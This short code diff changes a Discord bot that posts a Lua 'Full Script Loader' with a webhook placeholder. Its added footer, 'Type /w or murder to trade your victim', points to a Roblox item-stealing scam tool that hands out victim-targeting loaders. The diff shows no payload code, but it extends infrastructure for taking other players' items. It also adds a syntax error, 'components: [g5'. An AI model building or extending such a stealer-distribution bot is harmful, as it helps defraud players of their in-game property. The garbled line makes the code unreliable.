@@ -292,9 +292,12 @@ Webhook = "${webhook}"
            embeds: [{
              title: "📋 **Full Script Loader**",
              description: `\`\`\`lua\n${loadstringCode}\n\`\`\``,
-             color: 0xFF0000 // Red color
+             color: 0xFF0000, // Red color
+             footer: {
+               text: "Type /w or murder to trade your victim"
+             }
            }],
-           components: [
+           components: [g5
              new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                  .setCustomId(`copy_loadstring_${scriptId}`)
